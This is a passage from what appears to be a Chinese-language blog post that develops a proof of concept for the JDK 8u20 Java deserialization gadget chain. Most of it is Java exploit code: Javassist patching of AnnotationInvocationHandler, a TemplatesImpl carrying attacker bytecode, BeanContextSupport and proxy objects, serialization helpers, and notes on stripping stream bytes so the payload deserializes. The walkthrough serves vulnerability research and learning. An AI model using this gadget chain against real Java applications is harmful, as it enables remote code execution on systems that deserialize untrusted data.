+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>CtClass</span><span class=w> </span><span class=n>cc</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>pool</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=s>&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>CtMethod</span><span class=w> </span><span class=n>writeObject</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>CtMethod</span><span class=p>.</span><span class=na>make</span><span class=p>(</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=s>&#34;private void writeObject(java.io.ObjectOutputStream out) throws IOException {&#34;</span><span class=w> </span><span class=o>+</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=s>&#34;    out.defaultWriteObject();&#34;</span><span class=w> </span><span class=o>+</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=s>&#34;}&#34;</span><span class=p>,</span><span class=w> </span><span class=n>cc</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>cc</span><span class=p>.</span><span class=na>addMethod</span><span class=p>(</span><span class=n>writeObject</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>cc</span><span class=p>.</span><span class=na>toClass</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>setFieldValue</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>obj</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>field</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=n>value</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>f</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>obj</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=n>field</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>f</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>f</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>obj</span><span class=p>,</span><span class=w> </span><span class=n>value</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=nf>serialize</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>obj</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ByteArrayOutputStream</span><span class=w> </span><span class=n>baos</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ByteArrayOutputStream</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ObjectOutputStream</span><span class=w> </span><span class=n>oos</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ObjectOutputStream</span><span class=p>(</span><span class=n>baos</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>oos</span><span class=p>.</span><span class=na>writeObject</span><span class=p>(</span><span class=n>obj</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>oos</span><span class=p>.</span><span class=na>close</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>baos</span><span class=p>.</span><span class=na>toByteArray</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>unserialize</span><span class=p>(</span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>bytes</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ByteArrayInputStream</span><span class=w> </span><span class=n>bais</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ByteArrayInputStream</span><span class=p>(</span><span class=n>bytes</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ObjectInputStream</span><span class=w> </span><span class=n>ois</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ObjectInputStream</span><span class=p>(</span><span class=n>bais</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>ois</span><span class=p>.</span><span class=na>readObject</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>依旧报错，调试发现在这里到下面的 switch 语句会直接跳出<img src=/p/jdk8u20-deserialization/6.png width=2400 height=1103 loading=lazy alt=img></p><p>将序列化函数和反序列化函数进行修改，写入到文件中，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>serializeToFile</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>obj</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>filename</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>(</span><span class=n>FileOutputStream</span><span class=w> </span><span class=n>fos</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>FileOutputStream</span><span class=p>(</span><span class=n>filename</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>             </span><span class=n>ObjectOutputStream</span><span class=w> </span><span class=n>oos</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ObjectOutputStream</span><span class=p>(</span><span class=n>fos</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>oos</span><span class=p>.</span><span class=na>writeObject</span><span class=p>(</span><span class=n>obj</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>unserializeFromFile</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>filename</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=p>,</span><span class=w> </span><span class=n>ClassNotFoundException</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>(</span><span class=n>FileInputStream</span><span class=w> </span><span class=n>fis</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>FileInputStream</span><span class=p>(</span><span class=n>filename</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>             </span><span class=n>ObjectInputStream</span><span class=w> </span><span class=n>ois</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ObjectInputStream</span><span class=p>(</span><span class=n>fis</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=n>ois</span><span class=p>.</span><span class=na>readObject</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>分析下序列化流，找到3109的位置</p><p><img src=/p/jdk8u20-deserialization/7.png width=2537 height=1405 loading=lazy alt=img></p><p><a class=link href=https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html target=_blank rel=noopener>https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html</a> 查看文档发现是</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>final</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>byte</span><span class=w> </span><span class=n>TC_ENDBLOCKDATA</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=kt>byte</span><span class=p>)</span><span class=n>0x78</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>final</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>byte</span><span class=w> </span><span class=n>TC_NULL</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=kt>byte</span><span class=p>)</span><span class=n>0x70</span><span class=p>;</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>把这两玩意删了，</p><p><img src=/p/jdk8u20-deserialization/8.png width=1828 height=1331 loading=lazy alt=img></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>Base.Unserialize.Jdk</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.FileInputStream</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.IOException</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.ObjectInputStream</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>Test1</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>filename</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;8u20.ser&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>unserializeFromFile</span><span class=p>(</span><span class=n>filename</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>unserializeFromFile</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>filename</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=p>,</span><span class=w> </span><span class=n>ClassNotFoundException</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>(</span><span class=n>FileInputStream</span><span class=w> </span><span class=n>fis</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>FileInputStream</span><span class=p>(</span><span class=n>filename</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>             </span><span class=n>ObjectInputStream</span><span class=w> </span><span class=n>ois</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ObjectInputStream</span><span class=p>(</span><span class=n>fis</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=n>ois</span><span class=p>.</span><span class=na>readObject</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><h3 id=最终poc>最终poc</h3><p>我们要把删除字节的功能实现在代码中，由于Byteutils有时候我获取不到，有时候又可以，保险起见，我直接从源码里面抄出来。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>Base.Unserialize.Jdk</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javassist.ClassPool</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javassist.CtClass</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javassist.CtMethod</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>ysoserial.Serializer</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javax.xml.transform.Templates</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.beans.beancontext.BeanContextSupport</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.*</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.*</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.*</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>jdk8u20FinalPoc</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>TemplatesImpl</span><span class=w> </span><span class=n>templates</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TemplatesImpl</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>templates</span><span class=p>,</span><span class=w> </span><span class=s>&#34;_name&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Pwnr&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>templates</span><span class=p>,</span><span class=w> </span><span class=s>&#34;_tfactory&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TransformerFactoryImpl</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>templates</span><span class=p>,</span><span class=w> </span><span class=s>&#34;_bytecodes&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=kt>byte</span><span class=o>[][]</span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>ClassPool</span><span class=p>.</span><span class=na>getDefault</span><span class=p>().</span><span class=na>get</span><span class=p>(</span><span class=n>Base</span><span class=p>.</span><span class=na>Unserialize</span><span class=p>.</span><span class=na>Base</span><span class=p>.</span><span class=na>Evil</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getName</span><span class=p>()).</span><span class=na>toBytecode</span><span class=p>()</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>});</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>BeanContextSupport</span><span class=w> </span><span class=n>bcs</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>BeanContextSupport</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>bcs</span><span class=p>,</span><span class=w> </span><span class=s>&#34;serializable&#34;</span><span class=p>,</span><span class=w> </span><span class=n>1</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>modifiedHandlerClass</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>createModifiedHandlerClass</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Constructor</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>ctor</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>modifiedHandlerClass</span><span class=p>.</span><span class=na>getDeclaredConstructor</span><span class=p>(</span><span class=n>Class</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>Map</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ctor</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>InvocationHandler</span><span class=w> </span><span class=n>ih</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>InvocationHandler</span><span class=p>)</span><span class=w> </span><span class=n>ctor</span><span class=p>.</span><span class=na>newInstance</span><span class=p>(</span><span class=n>Templates</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=o>&lt;&gt;</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>ih</span><span class=p>,</span><span class=w> </span><span class=s>&#34;type&#34;</span><span class=p>,</span><span class=w> </span><span class=n>Templates</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Map</span><span class=o>&lt;</span><span class=n>Object</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>&gt;</span><span class=w> </span><span class=n>tmpMap</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=o>&lt;&gt;</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>tmpMap</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=n>ih</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>bcs</span><span class=p>,</span><span class=w> </span><span class=s>&#34;children&#34;</span><span class=p>,</span><span class=w> </span><span class=n>tmpMap</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Templates</span><span class=w> </span><span class=n>proxy</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>Templates</span><span class=p>)</span><span class=w> </span><span class=n>Proxy</span><span class=p>.</span><span class=na>newProxyInstance</span><span class=p>(</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>jdk8u20FinalPoc</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getClassLoader</span><span class=p>(),</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>{</span><span class=n>Templates</span><span class=p>.</span><span class=na>class</span><span class=p>},</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>ih</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>LinkedHashSet</span><span class=o>&lt;</span><span class=n>Object</span><span class=o>&gt;</span><span class=w> </span><span class=n>set</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>LinkedHashSet</span><span class=o>&lt;&gt;</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>set</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=n>bcs</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>set</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=n>templates</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>set</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=n>proxy</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Map</span><span class=o>&lt;</span><span class=n>String</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>&gt;</span><span class=w> </span><span class=n>memberValues</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=o>&lt;&gt;</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>memberValues</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=s>&#34;f5a5a608&#34;</span><span class=p>,</span><span class=w> </span><span class=n>templates</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>ih</span><span class=p>,</span><span class=w> </span><span class=s>&#34;memberValues&#34;</span><span class=p>,</span><span class=w> </span><span class=n>memberValues</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
